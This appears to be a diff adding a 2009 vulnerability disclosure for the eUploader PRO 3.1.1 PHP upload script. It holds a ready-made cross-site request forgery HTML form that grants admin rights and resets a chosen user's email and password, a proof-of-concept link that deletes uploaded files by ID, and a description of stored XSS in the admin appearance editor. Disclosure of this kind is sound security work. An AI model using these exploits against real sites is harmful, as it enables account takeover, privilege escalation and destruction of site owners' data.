@@ -1,0 +1,56 @@
+[#-----------------------------------------------------------------------------------------------#]
+[#] Title: eUploader PRO 3.1.1 (XSRF/XSS) Multiple Vulnerabilities
+[#] Author: Milos Zivanovic
+[#] Email: milosz.security[at]gmail.com
+[#] Date: 16. December 2009.
+[#-----------------------------------------------------------------------------------------------#]
+[#] Application: eUploader PRO
+[#] Version: 3.1.1
+[#] Platform: PHP
+[#] Link: http://www.euploaderpro.com/
+[#] Price: ~70 USD
+[#] Vulnerability: Permanent XSS and XSRF Vulnerabilities
+[#-----------------------------------------------------------------------------------------------#]
+
+Word or two: I've tested version 3.1.1 but i'm sure that other
+versions are vulnerable to following exploits.
+
+[#]Content
+ |--Edit user settings (Add admin privilege)
+ |--Remove item by id
+ |--Edit appearance - Permanent XSS
+
+[*]Edit user settings (Add admin privilege)
+
+On eUploader PRO script there is no cross site request forgery
+protection and we can use this to edit any user's profile and set him
+regular or master admin privileges, change email and password. The
+only thing required is ID of the user we want to edit.
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/admin.php?page=user&id=[ID]" method="post">
+  <input type="hidden" name="id" value="[ID]">
+  <input type="hidden" name="admin_access" value="2">
+  <input type="hidden" name="email" value="my@email.com">
+  <input type="hidden" name="pass" value="hacked">
+  <input type="hidden" name="pass2" value="hacked">
+  <input type="submit" name="edit" value="Submit">
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[-]Remove item by id
+
+This will remove uploaded file by its id.
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/admin.php?delete=[ID]
+[POC----------------------------------------------------------------------------------------------]
+
+[+]Edit appearance - Permanent XSS
+
+In the edit appearance section in admin panel we can edit html code of
+header and footer. Those 2 fields are vulnerable to XSS injection and
+also they is seen in the front end of this upload script. Link:
+http://localhost/admin.php?page=appearance
+
+[#]EOF
